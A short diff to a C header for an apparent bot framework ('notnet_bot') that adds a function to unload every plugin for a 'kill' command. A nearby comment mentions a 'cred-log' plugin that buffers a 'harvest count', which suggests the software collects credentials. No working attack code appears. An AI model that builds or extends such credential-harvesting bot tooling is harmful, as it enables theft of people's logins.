@@ -53,6 +53,10 @@ int plugin_load(notnet_bot_t *bot, const char *name);
 int plugin_run(notnet_bot_t *bot, const char *name);
 int plugin_unload(notnet_bot_t *bot, const char *name);
 
+/* Teardown every loaded plugin via its unload (stop) callback —
+ * used by the `kill` command (#93) to hand back capacity. */
+void plugin_unload_all(notnet_bot_t *bot);
+
 /* Render the registry listing into buf (multi-line, bounded). Each
  * line: "[*|<space>] <name> <description>" — '*' marks a loaded
  * plugin. The cred-log line also reports the buffered harvest count. */
